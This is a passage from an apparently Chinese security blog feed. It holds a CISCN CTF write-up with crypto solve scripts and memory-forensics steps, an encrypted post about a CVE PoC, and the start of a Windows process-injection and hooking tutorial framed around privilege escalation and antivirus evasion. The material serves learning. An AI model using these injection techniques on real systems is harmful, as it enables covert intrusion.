operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>正确的题目</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">LCG</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>b <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>c <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>seed <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>                <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>seed <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n            <span class="token keyword">return</span> self<span class="token punctuation">.</span>seed                 <span class="token keyword">def</span> <span class="token function">output</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b = &#123;&#125;\nn = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>b<span class="token punctuation">,</span> self<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"seed = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        lcg <span class="token operator">=</span> LCG<span class="token punctuation">(</span><span class="token punctuation">)</span>            lcg<span class="token punctuation">.</span>output<span class="token punctuation">(</span><span class="token punctuation">)</span>            c1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span>            c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c1 <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c1<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token triple-quoted-string string">'''            b = 3831416627            n = 2273386207            seed = 2403188683            s1 = 260742417            s2 = 447908860            c1 = 17275            c2 = 28951            '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="密码2"><a class="header-anchor" href="#密码2">¶</a>密码2</h3><p>很简单的质因数gcd求因数</p><figure><div class="code-wrapper"><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">import gmpy2from Crypto.Util.number import *n1&#x3D; 12671827609071157026977398418260127577729239910356059636353714138256023623770344437013038456629652805253619484243190436122472172086809006270535958920503788271745182898308583012315393657937467583278528574109842696210193482837553369816110424840884683667932711439417044144625891738594098963618068866281205254024287936360981926173192169919836661589685119695804443529730259703940744061684219737502099455504322939948562185702662485642366411258841082322583213825076942399375712892608077960687636100621655314604756871227708407963698548718981737143081639214928707030543449473132959887760171345393471397998907576088643495456531e1&#x3D; 65537c1&#x3D; 5268497051283009363591890965286255308367378505062739645805302950184343652292967525985407935922935972883557494557593439711003227737116083417992112594428400382187113609935251268634230537282408994938066541612999550555591607744019286392765549844400176442415480559773688439693874264657925123598756193286897112566420847480601040372338338442932524410598834393630019038536173336696498743879160879377504894526001205060753543289059104874467150194596404490638065573974570258671195173327475871936431769234701590572816592485898568463143587137721883610069616008902637316459660001435171054741347142470208082183171637233299493273737n2&#x3D; 18090800828995898324812976370950614944724424095669490324214928162454640462382724191043785592350299626782376411935499259428970532102686361824967300649916495702138825182857737210486173137998811993244590794690070307872074705348982970060304389842338043432383690934814892283936018142382990267868341375956549210694354065317328612440672169232803362481090661368782599819926970968509827001203936933692777821117679448168400620234261164018167404541446201828349880887526076468982840569645753428057937172715073817332736878737709704495317549386111938639861221307607948775421897063976457107356574428602380790814162110473018856344871e2&#x3D; 4097c2&#x3D; 2326267610355516153575986453727161366266816656017644910981028690283132055217271939475840618294311986463011398892570340626131158223217558335139831985973737748812636360601010312490160903427322848411507157238373313053959092326875136396134997877757316339153327290508806645882428114647041522287934007579220769189583249469879165078254248922442084985860374461188259818592181294686890335242981199427715392978546977718475462727987012437677290341463732660152302257234030751774759466703002189003437204934438026047163828083902584763527752033035438078609950665211243112982373167722458975172667665849715372158378299319548194854914n3&#x3D; 14016899139767071357961567514373780608355222973882916699129907806456201886114368147540489514960479836424236595826190295819765979835270500889626994048655508134450908075698567925938340322498944878806273261377551132596295484579752118097281084614987064680928168918147910522922020462762688924459558896249968804885885853885632349539590507675397376494346489972596290270168847103345561743327300964196811506510943971437325302822974593782292850499524055338033832053610217461760698628614971171144300450574522839157187874548994036357212297166759231255765155759405207408315314182166142015547345744054533749334516820850300569790673e3&#x3D; 1048577c3&#x3D; 1507157402302225700443994264641838312753363380677759942918832857396550216927941389943122383728949792984913155517202501504817319345830153748955731880333992875210194306712098593166605310784068299411946792264365247471197716329666415403718297430110977954951479772565341847358286252098930408452594561104228639615640815799731581302607522977457874347224189202268831547055389518214072278766864028489294466057175201908756749666131546163372443691718757198229262989973810951064160488114367967684657242385568733678188829354802025582496625272334309487028498614869964712744826603931510547381997149345221530469380732265014466170524p &#x3D; gmpy2.gcd(n1,n2)q1 &#x3D; n1&#x2F;&#x2F;pd1 &#x3D; gmpy2.invert(e1,(q1-1)*(p-1))print(long_to_bytes(pow(c1,d1,n1)))q2 &#x3D; n2&#x2F;&#x2F;pd2 &#x3D; gmpy2.invert(e2,(q2-1)*(p-1))print(long_to_bytes(pow(c2,d2,n2)))p &#x3D; gmpy2.gcd(n2,n3)q1 &#x3D; n3&#x2F;&#x2F;pd1 &#x3D; gmpy2.invert(e3,(q1-1)*(p-1))print(long_to_bytes(pow(c3,d1,n3)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="misc1-取证"><a class="header-anchor" href="#misc1-取证">¶</a>misc1 取证</h3><p>这个misc我做的有点狗血和脑洞。<br>首先拿到之后，工具查看一下进程，发现是notepad和画图软件（这里我就忽略了还有一个写的程序wordpad）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d8fe2b750f393e8d1c442bc5fc7800d3517ffdd5.png" alt="图片.png"></p><p>然后把notepad东西dump出来</p><figure><div class="code-wrapper"><pre class="line-numbers language-Plain" data-language="Plain"><code class="language-Plain">Volatility Foundation Volatility Framework 2.6Process: 236Text:?Text:dText:Text:?Text:??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????Process: 372Text:?Text:dText:Text:?Text:f &#x3D; open(&#39;.&#x2F;flag.zip&#39;, &#39;rb&#39;).read()new &#x3D; open(&#39;.&#x2F;fffflllaag.dat&#39;, &#39;ab&#39;)letter &#x3D; &#39;&#39;secret &#x3D; int(letter,16)print(secret)for i in f:    n &#x3D; int(i) ^ secret    new.write(int(n).to_bytes(1, &#39;big&#39;))Process: 132Text:?Text:dText:Text:?Text:According to Homer&#39;s epic, the hero Achilles is the precious son of the mortal Polus and the beautiful fairy Thetis.It is said that her mother Tethys carried him upside down into the Styx river when he was just born, so that he could be invulnerable.Unfortunately, due to the rapid flow of the Ming River, his mother didn&#39;t dare to let go of his heel.The heel held by his mother was accidentally exposed outside the water, so the heel was the most vulnerable place, leaving the only &quot;dead hole&quot; in his body, so he buried the disaster.When he grew up, Achilles fought bravely. When he went to attack the city of Troy (the story of Trojan horse slaughtering the city), the brave Achilles singled out the Trojan general Hector, killed him and dragged his body to demonstrate.But later, after conquering Troy, Achilles was attacked by an arrow by Hector&#39;s brother-in-law Paris and hit his ankle - the hero fell to the ground and died at the moment of shaking.ankle, ankle, I love ankle.The password is ??k1eAn???Process: 2060Text:?Text:dText:Text:?Text:???????????????????????????????XOR?EOR????????????????????????????????letter?????????????????????????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>得到有效的信息</p><figure><div class="code-wrapper"><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">f &#x3D; open(&#39;.&#x2F;flag.zip&#39;, &#39;rb&#39;).read()new &#x3D; open(&#39;.&#x2F;fffflllaag.dat&#39;, &#39;ab&#39;)letter &#x3D; &#39;&#39;secret &#x3D; int(letter,16)print(secret) k1eAn for i in f:    n &#x3D; int(i) ^ secret    new.write(int(n).to_bytes(1, &#39;big&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>和passwd ??K1eAn??? 这里有五个数字不知道。</p><p>然后用工具搜了一下flag文件，找到了一个压缩包，dump出口里面存了</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c976b15ac7a25d56c78d58c224c7d05dae18551f.png" alt="图片.png"></p><p>这个就是加密之后的东西，需要我们找到letter还原出flag.zip，啊这里想到之前有个图片，然后搜图片，，然后dump出来，拿到图片</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-368bed714433476487e5dc2dbf15b93fdb704dab.png" alt="图片.png"><br>以为是png隐写，反正letter肯定在这里，但是我没有解出来，（问了别的师傅，好像是啥橡树置换，反正我也只是业余的misc选手。不太懂），于是我想到了data加密的时候，是一个一个字节写的，于是我直接爆破了127个可见字符串，在第十个拿到了flag.zip</p><p>flag.zip还打不开，要密码，这时候我又想到了passwd。本来是掩码爆破的，后来看时间太长了。我一看哇，不就是ankle写两遍吗<br>Ank1eAnk1e，然后就出了，里面是个txt</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62e333920aa772e310205dba52eb64aa2866d5e3.png" alt="图片.png"></p><p>然后就开始了对脑电波的过程，，，<br>知道我扫了一遍cmdline。。。发现了有个egg1.rtf<br>dump出来之后</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-704658b7d06eccd1b2725af87e264f90940dda4d.png" alt="图片.png"><br>然后就出了<br>flag=md5{You are the only weakness in my body}</p><h3 id="misc2-zipcracker2"><a class="header-anchor" href="#misc2-zipcracker2">¶</a>misc2 zipcracker2</h3><p>不写了伪加密和明文攻击一把梭</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-31375225c063062174436f57425c2564cd152f88.png" alt="图片.png"></p><h3 id="misc3-pngcracker"><a class="header-anchor" href="#misc3-pngcracker">¶</a>misc3 pngcracker</h3><p>这个也简单，binwalk发现一个压缩包，拉长png得到压缩包密码，然后压缩包里面的misc.png有lsb隐写，直接就出了</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-673596b978977bcfcb09ef245cb23de55cbe72ce.png" alt="图片.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-0277从漏洞报告到poc编写</title>
    <link href="/2022/06/29/CVE-2021-0277%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%88%B0poc%E7%BC%96%E5%86%99/"/>
    <url>/2022/06/29/CVE-2021-0277%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%88%B0poc%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再试试nc看看" data-whm="禁止修改">  <script id="hbeData" type="hbeData" data-hmacdigest="a58d0161209c9dca4f1c2121c96ac649879b41c317cf84af4e9dc4a85accca2f">cc0c0f8ba411acd26894e584ac9b5fdaa20ff2900fe7d80c1056c5376dd8b1f16568fb63c9a696d03755534cd1d7ec196f73fadd750d880e63e5e3d1bface87acd05a7bf4ecead3817dae235ecc9246793042c197ba0ff4113a30d35450a87af98d972accd703b84aa56be6d552a2cd8596d0b24e157285ff887d412a63787e4ee3279a709a715da068773007bdc33dfeb911fda1bac67aea16cfe4e50406054cd33026c8461c6327c748626056a2f4700127a30ec764275cc63937edf343ea685eafab9aeee5647244ca5369b29f1b30c088994cc15b892da848088f7837223179133e8f06c236c9a830c08f4d9af49236316ac0ae5fcd70c1386f06bd48655d24e09636e335f6f17eea688999deb68c37dd87d160d1b98544d38f54cbd94aad739230796ef716190a45c2859e9db653721bc2860440158b7e84d1d6aa3651e81dcea04a294345470ed70d0ca434e25288f0c222f4d21f4242dae7a4136fed8bc5668ac633d60fc6b12c59d95e15fcb4f9dd15a657d5eb5a7fc4e8610ef51e6d2af1160283aa1e383812cc4d69c766d7f411ae6f53e3b0d8869c09dcf432b27737a296f5e5a0efda3995a49b8716ec05ada25b02c5d9692e37c2d0acfdb26ad00f8d73a0d4263dd4804fd6378caded785ff2a8c94d5ac3e1652a1c01267f5bf88c7ae706462160ba375c65f0c106e254fc98fd6d658550c3fdba67276acaeb9eb934a9a9b576558d293f48092bd3e1c9cec9bd9b5f9ed05ff386120595ea0f4473f6fb431bf32cb9ad8518de1c2e3435a3a05b6e104a8685e8709d72ce363ad5a96395cafff1d2632eec94623ce5f4a4223580742c0cacecc4d1a3516da1b26a596fddaa3c82a955e28d5959e58bed5c7d9e3334853eb326f1955d964382d54372bc60029e7ec40c6f678ddc01bf79d6c1fa799aa2857f4c98a3a829e42f9d441196e9f2a26bdead7894d902b3f3c7a7e41aff83013f696ee2f3a19795b0cf21e6ea559ba01ca4ba008ffe9d2c34c06ee607930aa6ba5d4871783afe4ed2e8286d72884e7583a7d2e33813b5aa133f7cd1a378c8db95710cbd26a182231902bd4754afc9f76cde060a12b82edbb75ae05f24c07aa9f7f030f36581789fd523da8a52d00051226143897b90d376b72299dd1667b84190a4a7a7d38e7eec7db9575b46ddc7b0f5446ca2025597fb023bca97563988d4de8973a303490f5775600eb753f3b8c5efb768a91940be3fe9f8ddf4077fce1b08c45f9a16c3feac2e8822db3af3ed666500ab9aee46126e2064311d40560b19bc73846e118ad2b9696f5b5f095f1c7453f44772ce96de1b8fc9b2f9a7b411f4c3c4ab8cfca332a6ef567f7b211ca81add2dccf2a25aacde09459858db5a41dc75fbbe671b5fee720ee58ae869d4dfa890486c29af1e2e18828ccb4e5f6d295c9321eaae6e51442adc4fa776b93cb5dcc03cc34175a4418e7361f3973844c8cf3c68068b55450cb99990b24fa34eb9b1062fd7da77793d7d0ac718f1ba806bce539de9339b989e14bbfd4f392b196980e4c772d2f08e3cc284c3a81518f278ffc62c8e9767363b3b0d433bde881c838e0b5dcd816a91f95ab8a1061540fcd01f772bec097b49d8fe8547ac2f8a4b6115b407e8aa5a8715f1c70632fde3299a41e19c10bf2827656bdf8be30558c723a33b2d109f461505fb6822501a7e2dca202349add33e021bcc5424c4b053823f4eed3069cc307de0a750d25e6611fb6b7c8ffd1088fc8ec76f1930c88f7d802f1d9f38e8cc7396363da9a37e78fb238bc9a76d14ef725dbba923d878d9ed68f7bb74bcaa300dea83a3b1d2070d982ca28d8195c7c8e9481fc517f4b3edee25647da4340e51a8aefe46fb6ba8398ca5f8885a9b072a2144bf39ef5ba33e89f635f5289938d341c1ab943c11a7c554d2a07c06ab8d17b41f63bcd23903ab56a4c84be49095f0114d0bc31d7119438f24e75e2128170a4fa637674ea291d84c2d9a37881b18ef1195f863d6bd1e15bbf41807f2844bec513ffba0abd672a2b6adc1e892e5606ab991bcf9860cd48853d6e9a60156d3742b3061e679badab1c7565acdc3f4933eb46744dd64f8224a57ea8d24bcf6bf9d0f633f9c57c5348ec87f60679b9009c6328b3e988741552fcbfdbd45ea2363ced7d6de5e3f11f7465497dfca8a915a0ae5fba785d3f02ea0ea9526c8c46276a9f2fc5946e91b559beceffac9d7798c0cbcf2c3565e7226a544b556d78fcd018bce102a1cf8f15a552b42093e8c46d70d295a0e9ddd24197491d0e47eca80c31ebb22ccaf5e7b3375953adf3d5efa335cc71b9ca557e3c14b0f15bd91cfb1a1d74a10ade872c0c5f124b266a37e7aed721247c8cc30edf8f47cf944912f038ac919b8e08ee74aa743eeb9ec0694e3080aacca4602b7c6dd73afa0af775c9780d7a27e06afb9aacbabe52f21c8546c64154ebbec3387d5f558a11709c9858035c649096f774251a43c4b0e6816fbd90f6b9dffae974957bf2c1ff2d12ee2fdf1c41c7a68237555582edd74f1c7dca45f08c7999a5d3b6a27724be87cb591c0076167411723d1c7a81653086fe7e66c90385bb4ea007f49bfc91f2aa6dce06f2ce8eac83a8ea8691d925b4497b101f3711b924db2f77e2656ff305b0a6fbb346d99655a4818d9f703b87ba60d7758ae6c5229679bec12e87b11370927b2eee7efe929f143c46950406bc641b818c3ca8d603157be42a5d51ad836abbd152f42c21278431a3ea144c2f21ca7b29e0e6ffe841145aa752953592dace35d006afbfd9d3956338f0a8a347c4d0d419eb0c506b866b7ac92a3a2bcf83efd432000a69f1f8e763cf33d1649ed9622a95a4c9fe2a1313b5c8f6b8405f6b5c8b3d9ab2d08d265ab72aba20baebaa7e15d5bbdf356923a6ee328483d6faf9770f4224f9cfc52c664a4328023e72b2395979ebbe234eb05f9b95cd147b85c0650f107b75416028fed5b08e7e3006a5ff8902c46bd03119f6a89f3937d7d60021f2331f411c8546a4bbc256259e72492ceb36874065718b6c94d1c6c6a313cad762bc32e97f240989c978348392322831fbcff2c923e5c06b25d31a2095a5f193bd0abeb00a1ee6feb9a884c784d816220424c954e7998d0b99aecdb4675576846227f33acf83d523c9b7ac140a64cb5530bfa0cc51b7bbe58bc55f5e1f373c0e6947fdbed500746e3f9dc31c967b3960c46081446162417892d50e0f20b20887fdcd35ac764ba3bccd4b96da97d3b9b25728ee38f0fadcf19627c6c8f98fdb3a8f47f18891aa1ffdc719bdc50a1ed90234a42ab302c726ef04ec9ef655a32b86bb1745a651faa2f946ef991f7219773a1b904f1e4d3ff7b19a78b4c44e87dcbacfc6bd49f14ec0e6e5b45070399e56fe150ee89a99ca0683dfe59faa05c2440162e6a002ed92e1bb2035bb7bc2d9edba0097ae724215fcdb38fc3d59c834dcca14b66e85fa7c95fb7e506a7fc1fd7a5eb778cbe24300be72ae586e7098ffd08f7064599933a466ef7bd17abe8ecfddf594c2d5adcccfd896c32c3913c8e9136416806be7b5f2eb642dd3453b7c1e3cc6935458d3fbc37a282a55f69d9d315e2b003f6986c3f8112ffc7d1321b90671feb47a01cd8d1eec13f379218e54aeea08ec366cde307d394c0c80a06123d13cb294980e7aec53c28345b1e63c2d1bf667fdae32be3e6bafdcf8a3d5fa4884909b77ea0eaa596b83cb71ab34237bddf687e36d9b6b0fcc8320d3840aeab97caf4629bd28c459e9223a475fdf7a4589c7aab7b266d27ab1d1676b2d200688b4ce3088515cb993a128fb18e673cbadf78793ba712d8d9b7defd83a171866fb8e940bd0f36cd580d58681131e5d713f680ca0470c064655f305102be106955f75b6e313730a96abdc9f844dada90532707a51297eb9150c3c2b14860934023057d1e7e07d459166352c4dc341fc01565784cac2652850b1e62aad401acd272e6489d61ac67a8ab05e3bd27e615f5a2886aacc06275936a7d591aaf26421da69aa06181c2f11f857b94b7eb7d7096ad92671cb3b8f429664bdd44027a37362cbc69b18df9883d6332bb24c823413ab6fb6aff186e0fd08134377c3258bc552b3bd653c02ea1e4bd904ae6ed3ec3ef24563ac9bc7d539ba494d7688129ce1def1507bcd83584eb512891eb687c9f27879e886a4f87e2bdbcb835c4bb98c5fc3d026cd1ac8ddabd84686a7374f54a8fad231037948b3e54294bcb4a8a387bdd57b1d4086ffb2072a53f12f0f6145fa662c9fc750c7af5e1c07db9e323eb81abbc9bae9496a4a1123412d2871f34ce5a6c0a11ae1865f0206a2288ab6b33b73cba3012003a10dd143d27240554f106b343a1c85a108dda5096db3fd475b30a89a62ca6acd24715e719d9efd66f1cf14488f17a62d35c3324f513d50ffe6c4c811f7ccf6e8e8890914d32b0af909369adad27ebfc56c6f99f9d6421d845d8f23634c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">已经在做了，快了快了</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT/juniper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从进程注入到提权</title>
    <link href="/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1>从进程注入到提权</h1><p>windows下的一系列注入手段在免杀和提权上有较大的用处，学习进程注入对Windows安全的理解有重要的帮助。</p><h2 id="0x01-什么是进程注入"><a class="header-anchor" href="#0x01-什么是进程注入">¶</a>0x01 什么是进程注入</h2><p>类似于linux下的ROP，进程注入即为在一个独立活动的进程中地址空间执行任意代码的方式，此时被执行的任意代码可以访问源进程的所有资源空间，常常被用来提权，同时，该方式通过注入正常的进程，常常可以绕过杀软的检测和白名单检测。</p><p>从原理上讲，进程注入改善了不可见性，同时一些技术也实现了持久性。</p><p>目前大致上有两种注入方法。</p><ul><li>dll注入</li><li>shellcode注入</li></ul><p>个人认为在本质上，二者都是操作系统可以执行的代码，为了方便开发，代码通常会以dll的形式编译和传播，实际上进行注入的时候，作为loadlibrary被加载。</p><p>注入的方式多种多样，这里我们主要看到两种注入的方式，<strong>dll和pe注入</strong></p><h2 id="0x02-几种进程注入的方式"><a class="header-anchor" href="#0x02-几种进程注入的方式">¶</a>0x02 几种进程注入的方式</h2><h3 id="dll编写规则"><a class="header-anchor" href="#dll编写规则">¶</a>dll编写规则</h3><p>首先我们需要了解一下dll的编写规则和一些具体的实现。</p><p>DLL（Dynamic Linkable Library）它提供一些可以直接使用的变量，类和函数。在经历了“无库—静态链接库—动态链接库”的历程后，dll使用十分广泛。</p><p><a href="https://blog.csdn.net/W_Y2010/article/details/80428067">https://blog.csdn.net/W_Y2010/article/details/80428067</a></p><p>编写规则和之前写过的tinystl差不多，语法也是单纯的c语言语法。有一点不一样的是</p><p><img src="https://i.bmp.ovh/imgs/2022/06/27/2bb043f58574f84d.png" alt=""></p><p>函数的返回值使用dll的extern 声明，表明后面的函数是dll的导出函数。基本用法就是这样还有一些别的用法不赘述，本次的重点是弄明白dll注入和hook注入和pe注入三种方式。</p><h3 id="hook注入原理"><a class="header-anchor" href="#hook注入原理">¶</a>hook注入原理</h3><p>什么是hook呢？联想glibc中的hook，调用malloc和free之前会查看其中的hook。实际上抽象出来，Windows下的hook机制也和其类似。</p><blockquote><p>hook作为一种消息监听机制，程序可以通过hook对消息或窗口进行监听，，即hook可以和特定的时间挂钩，当应用程序触发该特殊事件之后，操作系统即会向hook发出通知消息，此时hook函数就会响应对应的消息。</p></blockquote><p><img src="https://i.bmp.ovh/imgs/2022/06/27/2974a5f11e3b5ba7.png" alt=""></p><p>这里借用别人的图来解释一下钩子的机制， 在Micrisoft Windows中， 每个进程都有自己的私有地址空间。当我们用指针来引用内存的时候，指针的值表示的是进程自己的自制空间的一个内存地址。进程不能创建一个指针来引用属于其他进程的内存。</p><p>这样虽然一定程度上保证了程序的安全性，但是却也使我们很难编写能够与其他进程通信的应用程序或对其他进程进行操控的应用程序。</p><p>hook就被用来再被调用函数和调用进程中充当一个中间人，用来接受消息，处理消息和转发消息。</p><p>Hook的类型在Windows下也有很多种，消息hook，注入hook，inline内联hook等，hook注入中，<strong>重点学习的是其中的注入hook</strong>，<strong>注入hook</strong>，和hjacking差不多，就是劫持API的调用函数。</p><p>但是前面说了，每个进程有一个私有的内存空间，那么我如果想要A进程hookB进程的函数，但是A又不可以直接访问B的内存空间，那么应该怎么办？</p><p>这个时候考虑到dll动态链接库的注入技术，hook和dll注入结合即可解决这个问题。<strong>把hook的代码写入dll中，让B程序加载dll，则hook即可生效</strong>，乍一看感觉还不如直接shellcode来的实在。一般的注入流程如下：</p><ol><li>安装一个钩子（系统的dll注入被hook）</li><li>保存系统函数入口处的代码</li><li>替换掉进程中的系统函数入口指向我们的函数（直接修改地址空间的字节）</li><li>当系统函数被调用时立即跳转到我们的函数</li><li>函数处理</li><li>恢复系统函数入口的代码（处理后拖钩）</li></ol><p>这时候我们回去看到给的实验代码：</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/420c2138c2b9725b.png" alt=""></p><p>有两个cpp函数，keyhook是编译成dll的cpp，上面是hook程序的exe，也即是A程序。</p><p>实现的内容是，用键盘hook技术拦截notepad.exe进程的键盘消息，使之无法显示在记事本中</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;HookMain#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#defineDEF_DLL_NAME&quot;KeyHook.dll&quot;#defineDEF_HOOKSTART&quot;HookStart&quot;#defineDEF_HOOKSTOP&quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main()&#123;HMODULEhDll &#x3D; NULL; &#x2F;&#x2F;代表应用程序载入的模块,被载入模块的线性地址PFN_HOOKSTARTHookStart &#x3D; 